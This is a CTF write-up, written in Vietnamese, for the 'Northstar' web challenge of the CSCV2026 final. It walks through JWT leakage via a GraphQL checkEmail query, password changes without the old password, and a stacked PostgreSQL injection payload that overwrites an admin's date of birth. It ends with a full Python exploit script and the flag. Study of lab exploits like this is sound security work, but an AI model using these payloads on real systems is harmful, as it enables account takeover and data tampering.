---
title: "Web2 - CSCV2026"
date: 2026-10-26
draft: false
url: /posts/northstar/
subject: CTF Writeups
topic: Web Security
tags:
  - graphql
  - jwt
  - sqli
summary: Phân tích thử thách Web CTF Northstar, tập trung vào GraphQL, JWT và SQL Injection.
---

## 1. Thông tin thử thách
- **Tên bài**: Northstar
- **Thể loại**: Web Exploitation
- **Mục tiêu**: Lấy flag tại endpoint `/api/admin/get-flag-1iduhx` trên Northstar 2.0.
- **Các endpoint**:
  - **Northstar 2.0**: `https://northstar-a164cb1a4606.59.153.245.193.sslip.io`
  - **Northstar Classic (Legacy)**: `https://northstar-classic-a164cb1a4606.59.153.245.193.sslip.io`
- **Flag**: `CSCV2026{l3g4Cy_1D3Nt1ty_mi6ra7i0n_C0Mpl3te}`

---

## 2. Tổng quan kiến trúc hệ thống

Hệ thống bao gồm 2 dịch vụ web tương tác với nhau:

1. **Northstar 2.0 (Modern Platform)**:
   - Viết bằng Node.js / Express.
   - Hỗ trợ đăng ký, đăng nhập qua JWT (`v2-browser`).
   - Cung cấp tính năng **Legacy Account Migration** (2 bước):
     - **Bước 1** (`POST /api/migration/verify`): Nhận `identifier` và `password`, sau đó backend của v2 sẽ liên hệ sang dịch vụ Classic để xác thực. Nếu hợp lệ, trả về `migration_ticket` (hạn 10 phút) và `legacy_user_id`.
     - **Bước 2** (`POST /api/migration/confirm`): Nhận `legacy_user_id` và `migration_ticket`. Nếu tài khoản là quản trị viên, trả về HTTP `428 Precondition Required` yêu cầu trả lời câu hỏi bảo mật: *"What is the administrator's date of birth? (YYYY-MM-DD)"*.
   - Endpoint lấy flag: `/api/admin/get-flag-1iduhx`. Yêu cầu tài khoản hiện tại phải hoàn tất liên kết / di chuyển hồ sơ `administrator` từ hệ thống Classic.

2. **Northstar Classic (Legacy Platform)**:
   - Nền tảng cũ đang ở chế độ bảo trì / read-only, sử dụng cơ sở dữ liệu PostgreSQL.
   - Giao diện giao tiếp thông qua GraphQL tại endpoint `/graphql`.
   - Introspection (`__schema`) bị vô hiệu hoá, nhưng cơ chế gợi ý lỗi của GraphQL (field suggestions) vẫn hoạt động.

---

## 3. Quá trình phân tích và khai thác

### Bước 1: Rò rỉ JWT Auth Token qua GraphQL `checkEmail`
Khi xem xét mã nguồn giao diện frontend `legacy.js` trên Classic:
```javascript
email.addEventListener('input', () => {
  ...
  const check = (await graphql('query($email:String!){checkEmail(email:$email){available message session}}', { email: email.value })).checkEmail;
  if (session) session.value = check.session || '';
  ...
});
```
Trang đăng nhập Classic có hiển thị email liên hệ hỗ trợ: `support@ctf.local`.

Gửi truy vấn kiểm tra email `support@ctf.local`:
```graphql
query CheckEmail($email: String!) {
  checkEmail(email: $email) {
    available
    message
    session
  }
}
```
**Phản hồi từ server:**
```json
{
  "data": {
    "checkEmail": {
      "available": false,
      "message": "Email already registered",
      "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcm5hbWUiOiJzdXBwb3J0IiwiZW1haWwiOiJzdXBwb3J0QGN0Zi5sb2NhbCIsImRpc3BsYXlOYW1lIjoiQ3VzdG9tZXIgU3VwcG9ydCIsImlhdCI6MTc5MjExNTA0NiwiZXhwIjoxNzkyMTI5NDQ2LCJhdWQiOiJsZWdhY3ktYnJvd3NlciIsImlzcyI6Im5vcnRoc3Rhci1sZWdhY3ktd2ViIn0..."
    }
  }
}
```
> **Lỗ hổng 1**: Khi email đã tồn tại trong cơ sở dữ liệu, `checkEmail` vô tình trả về toàn bộ JWT auth token hợp lệ của người dùng đó mà không cần xác thực mật khẩu. Giải mã JWT cho thấy đây là tài khoản ID `#2` (`support`).

---

### Bước 2: Bỏ qua kiểm tra client bằng User-Agent & Chiếm quyền tài khoản `support`
Sử dụng JWT thu được để gọi các mutation trên Classic:
Ban đầu, các request từ công cụ (curl, python) bị từ chối với lỗi:
```json
{"errors":[{"message":"Account is not authorized for this client","extensions":{"code":"FORBIDDEN"}}]}
```
Khi bổ sung header `User-Agent` của trình duyệt:
```http
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```
Kiểm tra ủy quyền thành công. Dựa vào gợi ý lỗi GraphQL, chúng ta phát hiện mutation `updateUserPassword(newPassword: String!, confirmNew: String!)` cho phép đổi mật khẩu tài khoản hiện tại mà **không yêu cầu mật khẩu cũ**:
```graphql
mutation UpdateUserPassword($newPassword: String!, $confirmNew: String!) {
  updateUserPassword(newPassword: $newPassword, confirmNew: $confirmNew) {
    success
    message
  }
}
```
Thực hiện đổi mật khẩu tài khoản `support` thành `SupportPass12345!`.

---

### Bước 3: Di chuyển tài khoản `support` sang Northstar 2.0 để đọc hòm thư lưu trữ
Đăng ký một tài khoản mới trên Northstar 2.0, sau đó tiến hành di chuyển tài khoản Classic:
1. Gọi `POST /api/migration/verify` với `identifier: "support"` và `password: "SupportPass12345!"` -> Nhận được `migration_ticket`.
2. Gọi `POST /api/migration/confirm` với `legacy_user_id: 2` và `migration_ticket`.

Sau khi di chuyển thành công, tính năng xem tin nhắn lịch sử `/api/messages` được mở khóa. Trong danh sách tin nhắn nhập về, tin nhắn số 4 có nội dung:
```json
{
  "sender": "tier2@ctf.local",
  "subject": "Migration issue escalation",
  "body": "I'm unable to approve the migration batch from the support console. Could you ask ops-admin-7f3@ctf.local to review the failed imports before the next window?"
}
```
Từ đây, chúng ta tìm ra email thực sự của quản trị viên hệ thống Classic: `ops-admin-7f3@ctf.local`.

---

### Bước 4: Chiếm quyền tài khoản `administrator`
Tương tự như với tài khoản `support`:
1. Gọi `checkEmail(email: "ops-admin-7f3@ctf.local")` trên Classic để lấy session JWT của `administrator` (`legacy_user_id: 3`).
2. Gửi mutation `updateUserPassword` kèm token vừa lấy để đổi mật khẩu quản trị viên thành `AdminPassword123!`.

---

### Bước 5: SQL Injection trong `accountDirectory` & Ghi đè `date_of_birth`
Sau khi có phiên đăng nhập của `administrator`, query danh bạ `accountDirectory(keyword: String!)` được mở quyền truy cập.

Khi kiểm tra tham số `keyword`:
- Gửi `keyword: "'"` trả về lỗi cơ sở dữ liệu:
  ```json
  {"errors":[{"message":"unterminated quoted string at or near \"' LIMIT 10\""}]}
  ```
- Đây là lỗi cú pháp SQL trên PostgreSQL, xác nhận tham số `keyword` bị dính lỗi **SQL Injection**.

Thăm dò phân quyền trên bảng `users`:
- Thực hiện kiểm tra quyền cột thông qua `information_schema.column_privileges`:
  - `date_of_birth`: Có quyền **UPDATE**
  - `id`, `username`, `email`, `display_name`: Có quyền **SELECT**
  - Không có quyền `SELECT` trực tiếp trên `date_of_birth` để đọc ra dữ liệu ban đầu.

Tuy nhiên, thư viện kết nối PostgreSQL của Node.js hỗ trợ thực thi nhiều câu lệnh ngăn cách bởi dấu chấm phẩy (Stacked Queries). Vì có quyền `UPDATE` trên cột `date_of_birth` và `SELECT` trên `username`, ta có thể chủ động **ghi đè** ngày sinh của `administrator` thành một giá trị ta biết trước:
```sql
'; UPDATE users SET date_of_birth = '2000-01-01' WHERE username = 'administrator'--
```
Gửi payload này qua biến `keyword` của `accountDirectory`. Câu lệnh UPDATE được thực thi thành công trong database.

---

### Bước 6: Vượt qua xác thực 2FA trên Northstar 2.0 & Lấy Flag
1. Tiến hành di chuyển tài khoản quản trị viên trên Northstar 2.0:
   - Gọi `POST /api/migration/verify` với `identifier: "administrator"` và `password: "AdminPassword123!"` -> Nhận được `migration_ticket`.
2. Gọi `POST /api/migration/confirm` với `legacy_user_id: 3`:
   - Server phản hồi HTTP `428 Precondition Required`:
     ```json
     {
       "error": "Additional administrator verification required",
       "code": "ADMIN_SECURITY_QUESTION",
       "question": "What is the administrator's date of birth? (YYYY-MM-DD)"
     }
     ```
3. Gửi lại xác nhận kèm câu trả lời bí mật đã được ta thiết lập ở Bước 5:
   ```json
   {
     "legacy_user_id": 3,
     "migration_ticket": "<ticket>",
     "security_answer": "2000-01-01"
   }
   ```
   Server xác thực thành công và liên kết hồ sơ `administrator`.
4. Gửi request đến `/api/admin/get-flag-1iduhx`:
   ```json
   {
     "sender": "migration@ctf.local",
     "subject": "Migration verification record",
     "body": "Migration verification token:\n\nCSCV2026{l3g4Cy_1D3Nt1ty_mi6ra7i0n_C0Mpl3te}"
   }
   ```

---

## 4. Mã khai thác hoàn chỉnh (Solver Script)

Mã nguồn khai thác tự động từ đầu đến cuối được lưu trữ tại file:
👉 [`solver/solve.py`](file:///home/zu/CTF/competition/final_cscv2026/web/web02/solver/solve.py)

```python
import urllib.request, json, ssl, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

v2_base = 'https://northstar-a164cb1a4606.59.153.245.193.sslip.io'
classic_url = 'https://northstar-classic-a164cb1a4606.59.153.245.193.sslip.io/graphql'

# 1. Đăng ký tài khoản mới trên V2
v2_username = f"admin_winner_{int(time.time())}"
v2_reg_req = urllib.request.Request(
    v2_base + '/api/register',
    json.dumps({
        'username': v2_username,
        'email': f'{v2_username}@example.com',
        'password': 'WinnerPass12345!',
        'confirmPassword': 'WinnerPass12345!'
    }).encode(),
    {'Content-Type': 'application/json'}
)
with urllib.request.urlopen(v2_reg_req, context=ctx) as r:
    v2_tok = json.loads(r.read())['access_token']
print(f'1. Registered V2 user: {v2_username}')

# 2. Khai thác SQL Injection trên Classic để cập nhật date_of_birth của administrator
admin_classic_tok = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzIiwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwiZW1haWwiOiJvcHMtYWRtaW4tN2YzQGN0Zi5sb2NhbCIsImRpc3BsYXlOYW1lIjoiT3BlcmF0aW9ucyBBZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzkyMTE2NTQzLCJleHAiOjE3OTIxMzA5NDMsImF1ZCI6ImxlZ2FjeS1icm93c2VyIiwiaXNzIjoibm9ydGhzdGFyLWxlZ2FjeS13ZWIifQ.9CQbAfwihsQwIE52d4T4sylGlsna5hIjdLx3Bwg6l-A'
headers = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {admin_classic_tok}',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
}

sqli_payload = "'; UPDATE users SET date_of_birth = '2000-01-01' WHERE username = 'administrator'--"
sqli_req = urllib.request.Request(
    classic_url,
    json.dumps({
        'query': 'query Q($k: String!) { accountDirectory(keyword: $k) { id username } }',
        'variables': {'k': sqli_payload}
    }).encode(),
    headers
)
with urllib.request.urlopen(sqli_req, context=ctx) as r:
    print('2. SQL Injection executed:', r.read().decode())

# 3. Xác thực di chuyển hồ sơ administrator trên V2
ver_req = urllib.request.Request(
    v2_base + '/api/migration/verify',
    json.dumps({'identifier': 'administrator', 'password': 'AdminPassword123!'}).encode(),
    {'Content-Type': 'application/json', 'Authorization': f'Bearer {v2_tok}'}
)
with urllib.request.urlopen(ver_req, context=ctx) as r:
    ver_res = json.loads(r.read())
print('3. V2 Verify result:', ver_res)

ticket = ver_res['migration_ticket']
legacy_id = ver_res['legacy_user_id']

# 4. Xác nhận di chuyển kèm câu trả lời ngày sinh đã được ghi đè
conf_req = urllib.request.Request(
    v2_base + '/api/migration/confirm',
    json.dumps({
        'legacy_user_id': legacy_id,
        'migration_ticket': ticket,
        'security_answer': '2000-01-01'
    }).encode(),
    {'Content-Type': 'application/json', 'Authorization': f'Bearer {v2_tok}'}
)
with urllib.request.urlopen(conf_req, context=ctx) as r:
    print('4. V2 Confirm result:', r.read().decode())

# 5. Lấy Flag từ endpoint admin
flag_req = urllib.request.Request(
    v2_base + '/api/admin/get-flag-1iduhx',
    headers={'Authorization': f'Bearer {v2_tok}'}
)
with urllib.request.urlopen(flag_req, context=ctx) as r:
    print('5. FLAG RESULT:', r.read().decode())
```

---

## 5. Kết luận
Thử thách đòi hỏi sự kết hợp chuỗi nhiều lỗ hổng web:
1. **Broken Access Control & Information Leakage**: GraphQL trả về JWT session token của người dùng bất kỳ khi kiểm tra sự tồn tại của email.
2. **Missing Old Password Check**: Cho phép chiếm quyền tài khoản ngay khi có session token.
3. **Insecure Data Exposure**: Rò rỉ thông tin nội bộ và địa chỉ email nhạy cảm qua tính năng nhập tin nhắn lịch sử.
4. **Stacked SQL Injection**: Không chuẩn hóa tham số trong câu truy vấn PostgreSQL, cho phép thực thi câu lệnh UPDATE ghi đè thuộc tính nhạy cảm (`date_of_birth`).
5. **Logic / Precondition Bypass**: Sử dụng thuộc tính đã bị thao túng để vượt qua xác thực câu hỏi bảo mật trong quy trình di chuyển tài khoản.

